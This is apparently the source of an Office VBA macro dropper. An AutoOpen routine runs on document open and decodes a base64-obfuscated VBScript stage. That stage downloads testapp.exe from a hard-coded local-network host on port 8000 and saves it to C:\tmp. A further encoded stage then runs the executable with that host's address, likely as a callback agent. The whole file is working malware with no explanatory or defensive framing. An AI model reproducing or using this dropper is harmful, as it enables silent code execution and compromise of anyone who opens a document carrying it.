Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1

  'Create Stream object
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")

  'Specify stream type - we want To save binary data.
  BinaryStream.Type = adTypeBinary

  'Open the stream And write binary data To the object
  BinaryStream.Open
  BinaryStream.Write Binary

  'Change stream type To text/string
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText

  'Specify charset For the output text (unicode) data.
  BinaryStream.CharSet = "us-ascii"

  'Open the stream And get text/string data from the object
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function

Private Sub AutoOpen()
  basePath = "C:\tmp\"
  Set objFSO = CreateObject("Scripting.FileSystemObject")

  If objFSO.FolderExists(basePath) = False Then
    objFSO.CreateFolder basePath
  End If

  Set oXML = CreateObject("Msxml2.DOMDocument")
  Set oNode = oXML.CreateElement("base64")

  oNode.dataType = "bin.base64"
  oNode.text = "RnVuY3Rpb24gU3RyZWFtX0JpbmFyeVRvU3RyaW5nKEJpbmFyeSkKICBDb25zdCBhZFR5cGVUZXh0ID0gMgogIENvbnN0IGFkVHlw"+ _
"ZUJpbmFyeSA9IDEKCiAgJ0NyZWF0ZSBTdHJlYW0gb2JqZWN0CiAgRGltIEJpbmFyeVN0cmVhbSAnQXMgTmV3IFN0cmVhbQogIFNl"+ _
"dCBCaW5hcnlTdHJlYW0gPSBDcmVhdGVPYmplY3QoIkFET0RCLlN0cmVhbSIpCgogICdTcGVjaWZ5IHN0cmVhbSB0eXBlIC0gd2Ug"+ _
"d2FudCBUbyBzYXZlIGJpbmFyeSBkYXRhLgogIEJpbmFyeVN0cmVhbS5UeXBlID0gYWRUeXBlQmluYXJ5CgogICdPcGVuIHRoZSBz"+ _
"dHJlYW0gQW5kIHdyaXRlIGJpbmFyeSBkYXRhIFRvIHRoZSBvYmplY3QKICBCaW5hcnlTdHJlYW0uT3BlbgogIEJpbmFyeVN0cmVh"+ _
"bS5Xcml0ZSBCaW5hcnkKCiAgJ0NoYW5nZSBzdHJlYW0gdHlwZSBUbyB0ZXh0L3N0cmluZwogIEJpbmFyeVN0cmVhbS5Qb3NpdGlv"+ _
"biA9IDAKICBCaW5hcnlTdHJlYW0uVHlwZSA9IGFkVHlwZVRleHQKCiAgJ1NwZWNpZnkgY2hhcnNldCBGb3IgdGhlIG91dHB1dCB0"+ _
"ZXh0ICh1bmljb2RlKSBkYXRhLgogIEJpbmFyeVN0cmVhbS5DaGFyU2V0ID0gInVzLWFzY2lpIgoKICAnT3BlbiB0aGUgc3RyZWFt"+ _
"IEFuZCBnZXQgdGV4dC9zdHJpbmcgZGF0YSBmcm9tIHRoZSBvYmplY3QKICBTdHJlYW1fQmluYXJ5VG9TdHJpbmcgPSBCaW5hcnlT"+ _
"dHJlYW0uUmVhZFRleHQKICBTZXQgQmluYXJ5U3RyZWFtID0gTm90aGluZwpFbmQgRnVuY3Rpb24KCgpTZXQgb2JqSHR0cCA9IENy"+ _
"ZWF0ZU9iamVjdCgiV2luSHR0cC5XaW5IdHRwUmVxdWVzdC41LjEiKQpiYXNlUGF0aCA9ICJDOlx0bXBcIgp1cmwgPSAiaHR0cDov"+ _
"LzE5Mi4xNjguMTc4LjY3OjgwMDAvdGVzdGFwcC5leGUiCm9iakh0dHAuT3BlbiAiR0VUIiwgdXJsLCBGYWxzZQpvYmpIdHRwLlNl"+ _
"bmQKCmZpbGVQYXRoID0gYmFzZVBhdGggKyBNaWQodXJsLCBJblN0clJldih1cmwsICIvIikgKyAxKQoKU2V0IGJTdHJlYW0gPSBD"+ _
"cmVhdGVPYmplY3QoIkFkb2RiLlN0cmVhbSIpCgpXaXRoIGJTdHJlYW0KCS5UeXBlID0gMQoJLk9wZW4KCS5Xcml0ZSBvYmpIdHRw"+ _
"LlJlc3BvbnNlQm9keQoJLlNhdmVUb0ZpbGUgZmlsZVBhdGgsIDIKRW5kIFdpdGgKClNldCBvWE1MID0gQ3JlYXRlT2JqZWN0KCJN"+ _
"c3htbDIuRE9NRG9jdW1lbnQiKQpTZXQgb05vZGUgPSBvWE1MLkNyZWF0ZUVsZW1lbnQoImJhc2U2NCIpCm9Ob2RlLmRhdGFUeXBl"+ _
"ID0gImJpbi5iYXNlNjQiCm9Ob2RlLnRleHQgPSAiVTJWMElGZHphRk5vWld4c0lEMGdWMU5qY21sd2RDNURjbVZoZEdWUFltcGxZ"+ _
"M1FvSWxkVFkzSnBjSFF1VTJobGJHd2lLUXBYYzJoVGFHVnNiQzVTZFc0Z0lrTTZYSFJ0Y0Z4MFpYTjBZWEJ3TG1WNFpTQXhPVEl1"+ _
"TVRZNExqRTNPQzQyTnlJPSIKCkRpbSBGU08KU2V0IEZTTyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmpl"+ _
"Y3QiKQoKU2V0IE91dFB1dEZpbGUgPSBGU08uT3BlblRleHRGaWxlKGJhc2VQYXRoICsgInRlc3QxLnZicyIgLDggLCBUcnVlKQoK"+ _
"T3V0UHV0RmlsZS5Xcml0ZUxpbmUoU3RyZWFtX0JpbmFyeVRvU3RyaW5nKG9Ob2RlLm5vZGVUeXBlZFZhbHVlKSkKClNldCBGU089"+ _
"IE5vdGhpbmcKU2V0IFdzaFNoZWxsID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQpXc2hTaGVsbC5SdW4g"+ _
"IndzY3JpcHQgIiArIGJhc2VQYXRoKyArICJ0ZXN0MS52YnMi"


  Dim FSO
  Set FSO = CreateObject("Scripting.FileSystemObject")

  Set OutPutFile = FSO.OpenTextFile(basePath + "test.vbs" ,8 , True)

  OutPutFile.WriteLine(Stream_BinaryToString(oNode.nodeTypedValue))

  Set FSO= Nothing
  'Note Wscript.CreateObject must be replaced with CreateObject if running from Word
  Set WshShell = WScript.CreateObject("WScript.Shell")
  WshShell.Run "wscript "+ basePath+ "test.vbs "
End Sub
